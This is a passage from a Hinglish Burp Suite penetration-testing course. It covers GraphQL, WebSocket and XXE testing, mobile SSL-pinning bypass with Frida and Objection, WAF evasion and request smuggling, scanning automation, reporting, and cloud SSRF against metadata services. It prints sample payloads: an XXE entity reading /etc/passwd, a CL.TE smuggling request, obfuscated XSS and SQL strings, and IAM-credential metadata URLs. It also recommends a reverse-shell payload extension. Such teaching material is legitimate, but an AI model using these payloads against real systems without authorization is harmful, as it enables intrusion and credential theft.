- Agar introspection enabled hai, toh saare queries, mutations, fields dikh jayenge.

**Common Attacks:**
- **Introspection Enabled – Hidden Fields:** Schema mein `isAdmin`, `resetPassword` jaisi fields dhoondo jo UI mein nahi hain.
- **Batching Attacks (Rate Limit Bypass):** Ek request mein multiple mutations bhej kar rate limit bypass.
- **Deep Recursion Queries (DoS):** Circular queries se server resource exhaust.
- **Field Duplication:** Same field multiple times – server overload.
- **Injection in Arguments:** SQL/NoSQL injection in arguments.

> **Pro-Tip:** GraphQL endpoint mila? Pehle introspection query bhej. Schema mil gaya? Ab hidden fields search kar. Batching attack se rate limit bypass kar aur saara data nikaal.

### Topic 14.3: WebSockets Testing
**WebSocket Basics:** Full-duplex communication, persistent connection (ws://, wss://).

**Burp Configuration:**
- Proxy automatically WebSocket traffic intercept karta hai.
- **WebSockets History tab** mein saare messages dikhte hain.
- **Intercept WebSocket messages:** Proxy > Intercept > WebSocket sub-tab.

**Testing Methodology:**
- **Message Interception & Modification:** Real-time modify karo – XSS, IDOR.
- **Replay Attacks:** WebSocket message copy karo, Repeater ke WebSocket tab mein paste karo, send karo.
- **Connection Manipulation:** Origin header bypass, authentication bypass.
- **Injection Attacks:** SQL injection, command injection in messages.
- **Denial of Service:** Infinite messages, large payloads.

> **Pro-Tip:** WebSocket traffic intercept kar. Chat app test kar raha hai? Message mein XSS payload daal. Admin ko message bhej, jab wo dekhega, tera XSS trigger. IDOR check: `to` parameter change kar ke kisi aur ka message padh le.

### Topic 14.4: Content-Type Confusion & XXE
**Concept:** API accepts JSON but XML bhej kar dekho.

**JSON to XML Conversion:**
```
POST /api HTTP/1.1
Content-Type: application/xml
<user>admin</user>
```

**XXE (XML External Entity) Testing:**
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<user>&xxe;</user>
```

**Swagger/OpenAPI Discovery:**
- `/swagger.json`, `/swagger/v1`, `/api-docs` – ye endpoints often open hote hain.
- Mil gaya? Saare API endpoints ki list mil gayi, ab systematically test kar.

> **Pro-Tip:** JSON API hai toh XML bhej ke dekh. Accept kiya? XXE try kar. `/etc/passwd` read kar liya? Critical bug.

---

## **Module 15: Mobile Pentesting with Burp**

*Mobile apps ko intercept karna thoda tricky hai, lekin zaroori hai. SSL pinning, invisible proxy – ye sab aana chahiye.*

### Topic 15.1: SSL Pinning Bypass
**Problem:** Mobile apps Burp certificate accept nahi karte (SSL pinning).

**Solutions:**
- **A. Frida:**
  ```bash
  pip install frida-tools
  frida -U -f com.target.app -l frida-multiple-unpinning.js
  frida -U com.target.app -l ios-ssl-bypass.js
  ```
- **B. Objection:**
  ```bash
  pip install objection
  objection -g com.target.app explore
  > android sslpinning disable
  > ios sslpinning disable
  ```
- **C. Xposed Modules:** JustTrustMe, SSLUnpinning.
- **D. Re-patching APK:** APK decompile, network security config modify, recompile, sign.

> **Pro-Tip:** Mobile app mein traffic nahi aa raha? SSL pinning hai. Pehle Frida script try kar. 2 minute mein bypass ho jayega. Yaad rakh: pehle bypass, phir intercept.

### Topic 15.2: Invisible Proxying
**When Needed:** Apps jo system proxy ignore karte hain.

**Windows Setup:**
1. Burp > Proxy > Options > Add > Bind to port `8080`, All interfaces.
2. **Request Handling:** Support invisible proxying (enable).
3. Windows: `netsh winhttp set proxy localhost:8080`

**Linux/Android (iptables):**
```bash
iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination 127.0.0.1:8080
iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination 127.0.0.1:8080
```
- Saara traffic Burp par forward ho jayega.

**Transparent Proxy Mode:** Client ko proxy settings nahi batani padti, traffic automatically redirect.

> **Pro-Tip:** App proxy ignore kar raha hai? Invisible proxying mode on kar. Android rooted hai? iptables use kar ke saara traffic Burp par forward kar. Ab app ko pata bhi nahi chalega ki proxy use ho raha hai, lekin tu saara traffic dekh raha hai.

### Topic 15.3: Non-HTTP Traffic Interception
**Problem:** Mobile apps custom protocols use karte hain (XMPP, MQTT, raw TCP).

**Solution:** Burp Proxy Listener with invisible mode + network redirect. Burp raw data capture karega, tum manually analyze karo.
- **XMPP (Chat apps):** Port 5222, messages decode karo.
- **MQTT (IoT):** Port 1883, subscribe/publish messages, topic enumeration.
- **Custom Protocols:** Hex dump analysis, pattern identification, replay attacks.

### Topic 15.4: Burp Mobile Assistant
**Android Setup:**
1. Burp > Extender > BApp Store > Install Burp Mobile Assistant.
2. Android device par assistant app install karo.
3. QR code scan karo for configuration.

**Features:** Automatic proxy configuration, certificate installation helper, traffic recording controls.

**iOS Setup:** Manual proxy config, certificate install via Safari, trust certificate in Settings.

> **Pro-Tip:** Burp Mobile Assistant use kar, life easy ho jayegi. Ek click mein proxy set, certificate install. iOS mein certificate trust karna mat bhool.

---

## **Module 16: WAF/IPS Evasion Techniques**

*WAF tumhe block karta hai? Koi baat nahi, ye techniques seekh lo.*

### Topic 16.1: Advanced Match/Replace Rules
Burp ke Match/Replace se tum har request mein changes kar sakte ho.
- **User-Agent Rotation:** Randomly different User-Agent bhejo.
- **Header Randomization:** `X-Forwarded-For` spoofing, `Accept-Language` variation.

### Topic 16.2: Payload Obfuscation
**Encoding Techniques:**
- Base64, URL encoding (double, UTF-8), HTML entities, Unicode normalization.
- **Case Manipulation:** `<ScRiPt>alert(1)</ScRiPt>`
- **Comments Injection:** `SEL/*foo*/ECT/*bar*/username`

### Topic 16.3: Parameter Pollution
```
?id=1&id=2&id=3
?user=admin&user=guest
```
- Server kaunsa lega? Pehla? Akhri? Dono? Confusion paida karo.

### Topic 16.4: Rate Limiting Bypass
- **Resource Pool:** Delay between requests, random delays.
- **IP Rotation:** Upstream proxy chains, SOCKS proxy (Tor), residential proxies.
- **Session Rotation:** Har kuch requests ke baad new session, cookies clear.

### Topic 16.5: Request Splitting/Smuggling
**CL.TE (Content-Length vs Transfer-Encoding):**
```
POST / HTTP/1.1
Content-Length: 13
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
```
**TE.CL:** Reverse.

### Topic 16.6: WAF Fingerprinting & Bypass
**Identify WAF:** Response headers (`Server: cloudflare`), block page content.
**Bypass Techniques:**
- Size Limits Bypass (chunked requests).
- Signature Evasion (null bytes `%00`, newlines `%0a`).
- HTTP Verb Tampering (`HEAD /admin`, `POST /admin with GET parameter`).

> **Pro-Tip:** WAF block kar raha hai? Slow down. IP rotate kar. Payload encode kar. WAF confuse ho jayega. Phir bhi block ho raha hai? Request smuggling try kar. WAF ek request dekh raha hai, backend doosri.

---

## **Module 17: Advanced Scanning & Automation**

*Burp Professional ke scanning features ko optimize karo.*

### Topic 17.1: Custom Scan Configurations
- **Scan Speed vs Accuracy:**
    - Fast Scan: Critical issues only (5-10 min).
    - Deep Scan: All checks (1-2 hours).
    - Stealth Scan: Low and slow (1 request/sec).
- **Insertion Points:** Sab parameters, headers, cookies, JSON/XML nodes.

### Topic 17.2: Application Login Configuration
- **Recorded Login Sequences:** Manually login karte waqt Burp record kare, phir scan mein use kare.
- **Credential Management:** Multiple usernames/passwords provide karo.
- **2FA Handling:** OTP entry automation (advanced, but possible with macros).

### Topic 17.3: Resource Pools for Scale
- **Custom Pool Settings:** "WAF Bypass" – max concurrent 2, delay 2000ms, retries 3 with exponential backoff.
- **Pool Assignment:** Intruder → Aggressive pool (50 concurrent). Scanner → Balanced pool (10 concurrent). Manual testing → Single-threaded pool.

### Topic 17.4: Scheduled Scanning
- Burp Professional mein scheduled scans feature hai.
- Night scans schedule karo jab traffic kam ho.
- Email notifications.

> **Pro-Tip:** Scanner chala raha hai aur WAF block kar raha hai? Stealth mode use kar. Raat ko scan scheduled kar. Login sequence record kar ke de, scanner automatically login karega aur andar ke pages bhi scan karega.

---

## **Module 18: Professional Reporting & Remediation Verification**

*Bug dhoondhna aadha kaam hai, report likhna aur fix verify karna baaki aadha.*

### Topic 18.1: Client-Ready Reporting
- **Executive Summary:** Non-technical overview for management – risk, impact, business context.
- **Technical Findings:** Detailed steps, proof of concept (POC), screenshots, request/response.
- **CVSS Scoring:** Correct severity calculation – Base, Temporal, Environmental.
    - CVSS v3 calculator use karo. Impact aur Exploitability metrics samjho.

### Topic 18.2: Remediation Verification
- Client fix apply karega, tumhe re-test karna hoga.
- **Proof of Fix:** Same POC run karo, confirm vulnerability resolved.
- **False Positive Handling:** Scanner ki report mein false positives ho sakte hain. Manually verify karo aur report se hatao.

### Topic 18.3: Generating Reports in Burp
- **Target** tab → right-click on host → **Generate report**.
- Choose report type: HTML, XML.
- Select issues, include request/response, remediation.
- Customize template (if Pro).

> **Pro-Tip:** Report aisi banao ki CTO padh kar budget approve kare aur developer padh kar fix kar sake. Screenshots clear hon, steps reproducible hon.

---

## **Module 19: Custom BCheck Scripts**

*Burp Professional mein custom scan checks likhne ki language hai – BCheck. Isse app-specific logic bugs scanner mein add kar sakte ho.*

### Topic 19.1: What is BCheck?
- BCheck Burp ki scripting language hai jo custom active/passive scan checks banane deti hai.
- `.bcheck` files mein likhi jati hain.

### Topic 19.2: Basic BCheck Structure
```
metadata:
  language: v1-beta
  name: "Custom SQLi Check"
  description: "Detects SQL injection in parameter 'id'"
  author: "Your Name"

given host then
  send request:
    method: GET
    path: "/page?id=1'"
    follow-redirects: false

  if response.status == 200 and response.body contains "SQL syntax" then
    report issue:
      severity: high
      confidence: certain
      detail: "SQL injection detected with single quote."
```

### Topic 19.3: Use Cases
- **App-specific logic:** Tumhe pata hai ki is app mein 'X-Header' se SQLi hota hai, uska custom check banao.
- **Compliance checks:** Check karo ki specific headers present hain ya nahi.
- **False positive reduction:** Custom checks se noise kam karo.

### Topic 19.4: Sharing BCheck Scripts
- Team ke saath share karo.
- Burp BApp Store mein bhi contribute kar sakte ho.

> **Pro-Tip:** Default scanner sabke liye same hai, par tumhara client unique hai. BCheck scripts likhna seekh. Ye tumhe baaki testers se alag banata hai.

---

## **Module 20: Burp REST API & DevSecOps**

*Burp ko command line se chalana, CI/CD mein integrate karna – ye next level automation hai.*

### Topic 20.1: Burp REST API
- Burp Professional mein REST API enable kar sakte ho. Port usually 1337, authentication via API key.

### Topic 20.2: Common API Endpoints
- `/scan` – Start a new scan.
- `/scans` – List scans.
- `/issues` – Get findings.
- `/report` – Generate report.

### Topic 20.3: CI/CD Integration
**Jenkins / GitLab CI / GitHub Actions:**
- Code push hote hi automatically Burp scan trigger karo.
- API call bhejo scan start karne ke liye.
- Scan complete hone par report fetch karo.
- Build fail karo agar critical issues hain.

**Example curl command:**
```bash
curl -X POST "http://localhost:1337/v0.1/scan" \
  -H "Authorization: Bearer YOUR_API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"urls": ["https://staging.example.com"], "scan_configurations": ["ci_cd_scan"]}'
```

### Topic 20.4: Headless Burp (CLI)
- Burp Suite Pro command line se bhi chala sakte ho – headless mode.
- Load project file, start scan, export results.

> **Pro-Tip:** Bhai, sirf GUI pe depend mat reh. Seekh ki Burp REST API se scan kaise trigger karte hain. Jab developer code push kare, toh automatically Burp scan run hona chahiye. Ye hi asli DevSecOps hai.

---

## **Module 21: Cloud Security & Team Collaboration**

### Topic 21.1: Cloud Security Testing with Burp
**Cloud Metadata Service:**
- **AWS:** `http://169.254.169.254/latest/meta-data/`
- **Azure:** `http://169.254.169.254/metadata/instance?api-version=2017-08-01`
- **GCP:** `http://metadata.google.internal/computeMetadata/v1/`

**SSRF Vulnerability mein:** Tum Burp se request bhej kar in endpoints ko hit kar sakte ho. Agar server ne response diya, to IAM credentials, instance data leak ho sakta hai.

**IAM Credential Leakage:**
- AWS metadata se temporary credentials milte hain: `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>`
- Ye credentials use karke tum AWS resources access kar sakte ho.

**Cloud Storage Buckets:**
- **S3 buckets:** `https://<bucket>.s3.amazonaws.com`
- **Azure Blob:** `https://<storage>.blob.core.windows.net/<container>`
- Misconfiguration testing via Burp – try listing buckets, accessing private files.

**Serverless Testing:**
- AWS Lambda, API Gateway – API endpoints test karo. Serverless functions often have misconfigured permissions.

> **Pro-Tip:** Sirf app mat todo, uske peeche ka cloud todo. SSRF mila? Toh seedha AWS Metadata hit karne ki koshish kar. Agar wahan se IAM credentials mil gaye, toh poora cloud compromise. Ye bug bounty mein highest payout deta hai.

### Topic 21.2: Team Collaboration & Project Management
- **Burp Project Files (.burp):** State save/restore karo. Ek engagement ke saare findings, requests, responses ek file mein save ho jate hain.
- **Project Merging:** Do testers ka kaam ek file mein merge karo. Burp mein import functionality hai.
- **Comments & Issue Assignment:** Har issue par comment add kar sakte ho – "Needs verification", "Fixed, waiting for re-test". Team members ko assign kar sakte ho.
- **Scan Comparison:** Purane scan aur naye scan ka comparison – regression testing. Check karo ki jo issues pehle the, wo fix ho gaye ya nahi.

> **Pro-Tip:** Team mein kaam karte ho toh project files ka version control rakhlo. Git mein bhi daal sakte ho. Comments se communication clear rahega.

---

## **Module 22: Extra Tips & Tricks (Pro Level)**

*Ye wo tips hain jo ek **Noob** aur **Pro Pentester** ke beech ka difference dikhati hain.*

- Aap URL copy karke seedha **Repeater** tab mein `Right Click -> Paste URL as Request` kar sakte hain.
- > **Note:** **HACKTOOLS** Firefox extension hacker's ke liye best hai.
    > * Is extension mein aapko saare **Payloads** mil jayenge (e.g., XSS payloads).
    > * Isme aapko har language ke **Reverse Shell** payloads (Python, Bash, Netcat, etc.) milte hain.
    > * Ye hacking ke liye ek unique extension hai jo aapka kaafi time save karti hai.

---

